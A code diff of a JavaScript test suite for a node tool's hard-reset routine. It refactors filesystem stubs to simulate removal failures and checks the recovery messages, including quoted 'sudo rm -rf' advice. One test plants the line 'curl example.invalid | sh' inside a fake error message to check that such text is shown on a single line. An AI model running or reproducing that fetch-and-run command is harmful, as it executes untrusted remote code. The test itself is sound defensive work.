@@ -64,6 +64,33 @@ describe('resetNodeTaskFactory', () => {
     return filePath;
   }
 
+  /**
+   * @param {string} code
+   * @param {string} message
+   * @return {Error} an error as Node's filesystem calls throw it
+   */
+  function fsError(code, message) {
+    return Object.assign(new Error(message), { code });
+  }
+
+  /**
+   * Make Node's recursive removal of a path fail, the files left in place
+   *
+   * @param {sinon.SinonSandbox} sinon
+   * @param {string} targetPath
+   * @param {Error} error
+   */
+  function failRemoval(sinon, targetPath, error) {
+    const { rmSync } = fs;
+    sinon.stub(fs, 'rmSync').callsFake((removedPath, ...args) => {
+      if (removedPath === targetPath) {
+        throw error;
+      }
+
+      return rmSync.call(fs, removedPath, ...args);
+    });
+  }
+
   beforeEach(function beforeEach() {
     homeDir = HomeDir.createTemp();
 
@@ -353,17 +380,7 @@ describe('resetNodeTaskFactory', () => {
 
     // The members before it were already reset, and their files are gone.
     it('should say to render the other members too when removal fails', async function test() {
-      const filePath = homeDir.joinPath('local_1', 'platform', 'drive', 'tenderdash', 'config.toml');
-      const { unlinkSync } = fs;
-      this.sinon.stub(fs, 'unlinkSync').callsFake((removedPath) => {
-        if (removedPath === filePath) {
-          const error = new Error(`EIO: i/o error, unlink '${removedPath}'`);
-          error.code = 'EIO';
-          throw error;
-        }
-
-        return unlinkSync.call(fs, removedPath);
-      });
+      failRemoval(this.sinon, homeDir.joinPath('local_1', 'platform'), fsError('EIO', 'EIO: i/o error, rm'));
 
       await expect(hardReset({ isPlatformOnlyReset: true }))
         .to.be.rejectedWith("every config of group 'local'");
@@ -403,6 +420,28 @@ describe('resetNodeTaskFactory', () => {
      */
     function lockDirectory(...segments) {
       return lockDirectoryWithMode(0o555, ...segments);
+    }
+
+    /**
+     * Make a directory read-only once the reset's check has passed, just as
+     * Node's recursive removal of the Platform directory starts
+     *
+     * @param {sinon.SinonSandbox} sinon
+     * @param {...string} segments
+     * @return {string}
+     */
+    function lockDirectoryOnRemoval(sinon, ...segments) {
+      const targetPath = homeDir.joinPath('testnet', 'platform');
+      const { rmSync } = fs;
+      sinon.stub(fs, 'rmSync').callsFake((removedPath, ...args) => {
+        if (removedPath === targetPath) {
+          lockDirectory(...segments);
+        }
+
+        return rmSync.call(fs, removedPath, ...args);
+      });
+
+      return homeDir.joinPath(...segments);
     }
 
     /**
@@ -605,20 +644,11 @@ describe('resetNodeTaskFactory', () => {
     });
 
     it('should quote the path in the removal it advises once removal has begun', async function test() {
+      skipAsRoot(this);
       useHomeDirWithApostrophe();
 
-      const keyPath = homeDir.joinPath('testnet', 'platform', 'gateway', 'ssl', 'private.key');
+      lockDirectoryOnRemoval(this.sinon, 'testnet', 'platform', 'gateway', 'ssl');
       const platformPath = homeDir.joinPath('testnet', 'platform');
-      const { unlinkSync } = fs;
-      this.sinon.stub(fs, 'unlinkSync').callsFake((filePath) => {
-        if (filePath === keyPath) {
-          const error = new Error(`EPERM: operation not permitted, unlink '${filePath}'`);
-          error.code = 'EPERM';
-          throw error;
-        }
-
-        return unlinkSync.call(fs, filePath);
-      });
 
       await expect(hardReset({ isPlatformOnlyReset: true }))
         .to.be.rejectedWith(`  sudo rm -rf '${platformPath.split("'").join("'\\''")}'\n`);
@@ -650,20 +680,11 @@ describe('resetNodeTaskFactory', () => {
     });
 
     it('should give no removal to paste for a path holding a control character', async function test() {
+      skipAsRoot(this);
       useHomeDirWithApostrophe('dashmate-line\nbreak-');
 
-      const keyPath = homeDir.joinPath('testnet', 'platform', 'gateway', 'ssl', 'private.key');
+      lockDirectoryOnRemoval(this.sinon, 'testnet', 'platform', 'gateway', 'ssl');
       const platformPath = homeDir.joinPath('testnet', 'platform');
-      const { unlinkSync } = fs;
-      this.sinon.stub(fs, 'unlinkSync').callsFake((filePath) => {
-        if (filePath === keyPath) {
-          const error = new Error('EPERM: operation not permitted, unlink');
-          error.code = 'EPERM';
-          throw error;
-        }
-
-        return unlinkSync.call(fs, filePath);
-      });
 
       const error = await hardReset({ isPlatformOnlyReset: true }).then(
         () => { throw new Error('the reset succeeded'); },
@@ -701,17 +722,11 @@ describe('resetNodeTaskFactory', () => {
     });
 
     it('should show a filesystem error on one line', async function test() {
-      const keyPath = homeDir.joinPath('testnet', 'platform', 'gateway', 'ssl', 'private.key');
-      const { unlinkSync } = fs;
-      this.sinon.stub(fs, 'unlinkSync').callsFake((filePath) => {
-        if (filePath === keyPath) {
-          const error = new Error('EIO: i/o error\nRun: curl example.invalid | sh');
-          error.code = 'EIO';
-          throw error;
-        }
-
-        return unlinkSync.call(fs, filePath);
-      });
+      failRemoval(
+        this.sinon,
+        homeDir.joinPath('testnet', 'platform'),
+        fsError('EIO', 'EIO: i/o error\nRun: curl example.invalid | sh'),
+      );
 
       const error = await hardReset({ isPlatformOnlyReset: true }).then(
         () => { throw new Error('the reset succeeded'); },
@@ -759,78 +774,68 @@ describe('resetNodeTaskFactory', () => {
     });
 
     // A directory that becomes read-only between the check and the removal
-    // keeps its entries; the rest is still removed and the path named.
-    it('should go on past a directory that turns read-only during removal', async function test() {
-      const sslPath = homeDir.joinPath('testnet', 'platform', 'gateway', 'ssl');
-      const { accessSync } = fs;
-      let sslChecks = 0;
-      this.sinon.stub(fs, 'accessSync').callsFake((checkedPath, mode) => {
-        if (checkedPath === sslPath) {
-          sslChecks += 1;
+    // makes Node's recursive removal fail, naming the target at most. The
+    // reset does not go on past the failure: it names each path left that this
+    // user cannot remove, and how to recover.
+    it('should name what is left that it cannot remove once removal has failed', async function test() {
+      skipAsRoot(this);
 
-          if (sslChecks > 1) {
-            const error = new Error(`EACCES: permission denied, access '${checkedPath}'`);
-            error.code = 'EACCES';
-            throw error;
-          }
-        }
-
-        return accessSync.call(fs, checkedPath, mode);
-      });
+      const sslPath = lockDirectoryOnRemoval(this.sinon, 'testnet', 'platform', 'gateway', 'ssl');
+      const platformPath = homeDir.joinPath('testnet', 'platform');
 
       const error = await hardReset({ isPlatformOnlyReset: true }).then(
         () => { throw new Error('the reset succeeded'); },
         (e) => e,
       );
 
-      expect(error.message).to.include(`'${sslPath}'`);
+      expect(fs.rmSync.withArgs(platformPath)).to.have.been.calledOnce();
+      expect(error.message).to.include('for lack of permission');
+      expect(error.message.split('\n')).to.include(`  '${sslPath}'`);
       expect(error.message).to.include('dashmate config render --config testnet');
-      expect(fs.existsSync(homeDir.joinPath('testnet', 'platform', 'drive'))).to.be.false();
-      expect(fs.existsSync(homeDir.joinPath('testnet', 'platform', 'gateway', 'ssl', 'bundle.crt'))).to.be.true();
+      expect(fs.existsSync(path.join(sslPath, 'bundle.crt'))).to.be.true();
     });
 
     // Other failures during removal leave the same half-removed files behind.
     it('should give the same recovery for any other failure during removal', async function test() {
-      const keyPath = homeDir.joinPath('testnet', 'platform', 'gateway', 'ssl', 'private.key');
-      const { unlinkSync } = fs;
-      this.sinon.stub(fs, 'unlinkSync').callsFake((filePath) => {
-        if (filePath === keyPath) {
-          const error = new Error(`EIO: i/o error, unlink '${filePath}'`);
-          error.code = 'EIO';
-          throw error;
-        }
-
-        return unlinkSync.call(fs, filePath);
-      });
+      failRemoval(this.sinon, homeDir.joinPath('testnet', 'platform'), fsError('EIO', 'EIO: i/o error, rm'));
 
       await expect(hardReset({ isPlatformOnlyReset: true }))
         .to.be.rejectedWith(/EIO: i\/o error[\s\S]*dashmate config render --config testnet/);
     });
 
     // What the check cannot foresee, such as a file in a sticky directory or
-    // one marked immutable, fails once removal has begun. Compose then needs
-    // the service files rendered again before the reset can run.
-    it('should name what it could not remove once removal has begun', async function test() {
-      const keyPath = homeDir.joinPath('testnet', 'platform', 'gateway', 'ssl', 'private.key');
-      const { unlinkSync } = fs;
-      this.sinon.stub(fs, 'unlinkSync').callsFake((filePath) => {
-        if (filePath === keyPath) {
-          const error = new Error(`EPERM: operation not permitted, unlink '${filePath}'`);
-          error.code = 'EPERM';
-          throw error;
-        }
-
-        return unlinkSync.call(fs, filePath);
-      });
+    // one marked immutable, fails once removal has begun, and permissions do
+    // not show it. Node's error is shown, and Compose then needs the service
+    // files rendered again before the reset can run.
+    it('should show the removal\'s error for a failure the check cannot foresee', async function test() {
+      failRemoval(
+        this.sinon,
+        homeDir.joinPath('testnet', 'platform'),
+        fsError('EPERM', 'EPERM: operation not permitted, rm'),
+      );
 
       const error = await hardReset({ isPlatformOnlyReset: true }).then(
         () => { throw new Error('the reset succeeded'); },
         (e) => e,
       );
 
-      expect(error.message).to.include(`'${keyPath}'`);
+      expect(error.message).to.include('EPERM: operation not permitted, rm');
       expect(error.message).to.include('dashmate config render --config testnet');
       expect(dockerCompose.rm).to.have.been.calledOnce();
+    });
+
+    // Node's recursive removal is what the reset used before it could report
+    // each path, and it still removes the files. The walk only checks and
+    // reports.
+    it('should remove the files with Node\'s recursive removal', async function test() {
+      this.sinon.spy(fs, 'rmSync');
+      const platformPath = homeDir.joinPath('testnet', 'platform');
+
+      await hardReset({ isPlatformOnlyReset: true });
+
+      expect(fs.rmSync).to.have.been.calledWith(platformPath, { recursive: true, force: true });
+      expect(fs.existsSync(platformPath)).to.be.false();
+      expect(fs.existsSync(homeDir.joinPath('testnet', 'core', 'dash.conf'))).to.be.true();
     });
   });
 
